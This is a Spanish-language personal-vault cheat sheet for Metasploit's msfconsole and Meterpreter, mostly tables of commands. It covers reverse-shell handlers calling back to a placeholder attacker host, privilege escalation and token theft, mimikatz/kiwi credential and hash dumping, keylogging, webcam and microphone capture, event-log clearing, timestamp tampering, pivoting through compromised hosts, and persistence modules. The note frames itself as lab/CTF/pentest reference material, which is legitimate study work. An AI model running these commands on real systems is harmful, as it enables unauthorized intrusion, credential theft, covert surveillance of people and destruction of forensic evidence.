---
tipo: meta
aliases:
  - Metasploit - matriz
  - msfconsole cheatsheet
  - msf cheatsheet
tags:
  - meta/referencia
  - dominio/post-explotacion
---

# Metasploit - matriz de referencia

> [!info] Referencia pura, no un zettel
> Manejar `msfconsole` de punta a punta: consola, base de datos, módulos, payloads, sesiones, Meterpreter, post-explotación, pivoting y persistencia. Qué es la herramienta y **cuándo NO usarla**, en [[metasploit]]; generar el payload, en [[msfvenom - matriz de referencia]].

> [!warning] Fuertemente firmada
> Payloads y encoders default los levanta cualquier EDR (ver [[metasploit]] § Estado). Esto es laboratorio/CTF/demostración; en engagement con EDR real, o se evade en serio o se usa otra cosa.

`RHOSTS` = objetivo; `ATACANTE`/`PUERTO` = tu `LHOST`/`LPORT`. Sin datos de objetivo real.

## Consola y usabilidad

| Tarea | Comando |
|---|---|
| Arrancar silencioso | `msfconsole -q` |
| Ejecutar y seguir en consola | `msfconsole -q -x "use ...; set ...; run"` |
| Correr un script | `msfconsole -r script.rc` |
| Ayuda / ayuda de un comando | `help` · `help set` |
| Shell de Ruby embebido | `irb` (dentro: objeto `framework`) |
| Cliente tipo netcat | `connect ATACANTE PUERTO` |
| Guardar la salida a archivo | `spool /tmp/sesion.log` |
| Persistir el estado/opciones | `save` |
| Jobs (handlers y servicios) | `jobs -l` · matar: `jobs -k ID` · `jobs -K` (todos) |
| Globales entre módulos | `setg KEY val` · `unsetg KEY` · `get KEY` |


## Base de datos y workspaces

| Tarea | Comando |
|---|---|
| Iniciar la DB (una vez) | `msfdb init` · estado: `db_status` |
| Workspace por engagement | `workspace -a nombre` · cambiar: `workspace nombre` · listar: `workspace` |
| Escanear poblando la DB | `db_nmap -sV -sC RHOSTS` |
| Importar un escaneo | `db_import escaneo.xml` (de `nmap -oX`) |
| Ver lo recolectado | `hosts` · `services` · `vulns` · `creds` · `loot` · `notes` |
| Filtrar servicios | `services -p 445` · `services -s smb` |
| Setear RHOSTS desde la DB | `hosts -R` · `services -p 445 -R` |
| Credenciales reutilizables | `creds add user:... password:...` · `creds -o creds.csv` |

El workspace mantiene hosts/servicios/credenciales separados por objetivo. `-R` evita copiar IPs a mano: filtrás en la DB y pobla `RHOSTS` solo.

## Buscar y usar módulos

| Tarea | Comando |
|---|---|
| Buscar | `search type:exploit platform:windows smb` |
| Por CVE / nombre / rank | `search cve:2021 type:exploit` · `search name:eternalblue` · `search rank:excellent` |
| Usar | `use 0` (índice) o `use exploit/windows/smb/ms17_010_eternalblue` |
| Info y opciones | `info` · `show options` · `show advanced` |
| Objetivos y payloads compatibles | `show targets` · `set target N` · `show payloads` |
| Técnicas de evasión del módulo | `show evasion` |
| Setear / limpiar | `set RHOSTS RHOSTS` · `unset RHOSTS` · global: `setg LHOST ATACANTE` |
| Verificar sin explotar | `check` |
| Lanzar | `run` / `exploit` · en segundo plano: `exploit -j` · sin interacción: `exploit -z` |
| Reintentar / volver | `rerun` · `back` · `previous` |

Fijate el **rank** del módulo (`excellent` > `great` > … > `low`): los de rank bajo pueden tumbar el servicio.

## Opciones que casi siempre tocás

| Opción | Qué es |
|---|---|
| `RHOSTS` / `RPORT` | objetivo y puerto (acepta rango, CIDR, archivo `file:lista.txt`) |
| `LHOST` / `LPORT` | tu IP y puerto para el payload reverso |
| `PAYLOAD` | qué sesión querés (`set PAYLOAD windows/x64/meterpreter/reverse_tcp`) |
| `TARGETURI` / `VHOST` / `SSL` | ruta base, vhost y TLS en exploits web |
| `SRVHOST` / `SRVPORT` | dónde sirve el módulo su recurso (exploits de cliente/web) |
| `THREADS` | paralelismo en módulos auxiliary/scanner |
| `AutoRunScript` | script/post a correr apenas abre la sesión |


## Payloads y handler
Staged vs stageless, formatos y encoders → [[msfvenom - matriz de referencia]]. Dos formas de atrapar la sesión de un binario externo:
```sh
# a) handler de una línea
msfconsole -q -x "handler -H ATACANTE -P PUERTO -p windows/x64/meterpreter/reverse_tcp"
# b) módulo multi/handler (más control)
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ATACANTE; set LPORT PUERTO; set ExitOnSession false; exploit -j"
```
`PAYLOAD`/`LHOST`/`LPORT` deben coincidir **exactos** con los que usó msfvenom. Para una shell simple (no Meterpreter), alcanza un `nc -lvnp PUERTO` — ver [[Reverse y bind shells - matriz de referencia]] § listeners.

## Sesiones

| Tarea | Comando |
|---|---|
| Listar | `sessions -l` · verbose: `sessions -v` |
| Entrar | `sessions -i N` |
| A segundo plano | `background` (o `Ctrl+Z`) dentro de la sesión |
| Nombrar | `sessions -n nombre -i N` |
| Shell → Meterpreter | `sessions -u N` · o `use post/multi/manage/shell_to_meterpreter` |
| Correr comando en varias | `sessions -c "whoami" -i 1,2,3` |
| Correr un post en todas | `sessions -s checkvm` |
| Matar | `sessions -k N` · todas: `sessions -K` |


## Meterpreter — núcleo

| Tarea | Comando |
|---|---|
| Ayuda / a segundo plano | `help` · `background` (`bg`) |
| Contexto | `sysinfo` · `getuid` · `getpid` · `getprivs` |
| Ruby embebido en la sesión | `irb` |
| Correr un script/post | `run post/...` · `run <script>` |
| Migrar de proceso | `migrate PID` · `migrate -N explorer.exe` |
| Limpiar logs de eventos (Windows) | `clearev` |
| Salir de la sesión | `exit` (`-y` sin confirmar) |


## Meterpreter — sistema y tokens

| Tarea | Comando |
|---|---|
| Intentar SYSTEM | `getsystem` (`-t 0` prueba todas las técnicas) |
| Robar token de un proceso | `steal_token PID` — impersona su token; deshacer con `rev2self` · soltar con `drop_token` |
| Tokens disponibles (incognito) | `load incognito` · `list_tokens -u` · `impersonate_token 'DOM\user'` |
| Procesos | `ps` · `pgrep nombre` · `kill PID` |
| Variables de entorno | `getenv PATH` |
| Tiempo ocioso del usuario | `idletime` |
| Marcas de tiempo (anti-forense) | `timestomp archivo -m/-a/-c` |

**Robo de token vs `getsystem`:** `getsystem` llega a SYSTEM con exploits conocidos; `steal_token`/`incognito` **reutilizan un token ya presente** en memoria (admin de dominio, proceso SYSTEM) sin exploit — es la vía Meterpreter de la impersonación por `SeImpersonate`. `rev2self` vuelve a tu identidad.

## Meterpreter — archivos

| Tarea | Comando |
|---|---|
| Navegar | `pwd` · `cd` · `ls` · local: `lpwd` / `lcd` |
| Leer / editar | `cat archivo` · `edit archivo` |
| Transferir | `download ruta` · `upload local remoto` |
| Buscar archivos | `search -f *.kdbx` · `search -d C:\\Users -f *.txt` |
| Integridad | `checksum sha1 archivo` |


## Meterpreter — red

| Tarea | Comando |
|---|---|
| Interfaces y rutas | `ipconfig` / `ifconfig` · `route` · `arp` · `netstat` |
| Reenvío de puerto | `portfwd add -l 8080 -p 80 -r 10.10.0.5` · listar: `portfwd list` |
| Proxy del objetivo | `getproxy` |
| Resolver nombres por la sesión | `resolve host.interno` |


## Meterpreter — captura

| Tarea | Comando |
|---|---|
| Pantalla | `screenshot` · en vivo: `screenshare` |
| Teclado | `keyscan_start` → `keyscan_dump` → `keyscan_stop` |
| Cámara / micrófono | `webcam_snap` · `record_mic -d 10` |


## Meterpreter — extensiones

| Extensión | Carga | Comandos clave |
|---|---|---|
| kiwi (mimikatz) | `load kiwi` | `creds_all` · `lsa_dump_sam` · `lsa_dump_secrets` · `dcsync -u usuario` · `golden_ticket_create` · `kerberos_ticket_list` |
| incognito | `load incognito` | `list_tokens -u` · `impersonate_token` |
| python | `load python` | `python_execute "..."` · `python_import script.py` |
| powershell | `load powershell` | `powershell_shell` · `powershell_import x.ps1` · `powershell_execute "..."` |
| priv (Windows) | viene con stdapi | `hashdump` · `timestomp` |

kiwi y `lsa_dump_*` **requieren SYSTEM** (correr `getsystem`/`steal_token` antes). `hashdump` (priv) también.

## Post-explotación (módulos)

| Tarea | Módulo |
|---|---|
| Sugerir exploits locales de privesc | `use post/multi/recon/local_exploit_suggester` |
| ¿Es una VM? / antivirus | `post/windows/gather/checkvm` · `post/windows/gather/enum_av_excluded` |
| Usuarios conectados | `post/windows/gather/enum_logged_on_users` |
| Credenciales guardadas (navegador, apps) | `post/windows/gather/credentials/...` |
| Enumeración de Linux | `post/linux/gather/...` |
| Correr un post | `set SESSION N` · `run` |


## Pivoting por la sesión
Metasploit enruta tráfico de otros módulos **a través** de una sesión — cubre en parte el hueco de pivoting del vault ([[MOC - Movimiento lateral]]).

| Tarea | Comando |
|---|---|
| Ruta a la red interna | `run autoroute -s 10.10.0.0/24` · o `post/multi/manage/autoroute` |
| Ver / agregar ruta a mano | `route print` · `route add 10.10.0.0 255.255.255.0 N` |
| Reenvío local (acceso directo a un host interno) | `portfwd add -l 8080 -p 80 -r 10.10.0.5` |
| Reenvío reverso | `portfwd add -R -l 4444 -L ATACANTE -p 4444` |
| SOCKS para herramientas externas | `use auxiliary/server/socks_proxy; set SRVPORT 1080; run -j` → `proxychains` |

Con el SOCKS arriba, `proxychains nmap`/`crackmapexec` contra la red interna salen por la sesión. Doble pivote: `autoroute` sobre la segunda sesión suma su subred a la tabla de rutas de msf.

## Persistencia

> [!warning] Cambia el estado del sistema — fuera de alcance salvo autorización escrita
> Crear servicios, tareas o entradas de registro persiste más allá de la prueba y hay que revertirlo. Documentar qué se dejó y limpiarlo.

| Tarea | Módulo / comando |
|---|---|
| Ejecutable persistente | `post/windows/manage/persistence_exe` |
| Servicio | `post/windows/manage/sshkey_persistence` (Linux) · servicios en Windows vía módulo |
| Tarea programada / registro | módulos `post/windows/manage/...` |


## Resource scripts

| Tarea | Comando |
|---|---|
| Correr un script de comandos | `msfconsole -r script.rc` · dentro: `resource script.rc` |
| Grabar lo tipeado | `makerc script.rc` |
| Encadenar sin interactivo | `msfconsole -q -x "use ...; set ...; run; exit"` |
| Auto-correr post al abrir sesión | `set AutoRunScript post/windows/manage/migrate` |


## Errores / notas

| Síntoma | Causa | Salida |
|---|---|---|
| `search` vacío / lento | DB no iniciada | `msfdb init`, reabrir; `db_status` para confirmar |
| La sesión muere al conectar | `PAYLOAD` del handler ≠ del binario | igualar payload, LHOST y LPORT exactos |
| `getsystem` falla | sin vector de elevación | `local_exploit_suggester`, token theft, o privesc manual |
| kiwi/`lsa_dump` devuelve poco | sin SYSTEM | `getsystem`/`steal_token` antes de `load kiwi` |
| `migrate` falla | permisos / arquitectura distinta del proceso destino | migrar a un proceso del mismo usuario y arch |
| El binario lo borra el AV | payload/encoder firmado | ver [[metasploit]] § Estado; entrega en memoria o evasión real |
| Exploit tumba el servicio | módulo de rank bajo | revisar el rank antes de lanzar |

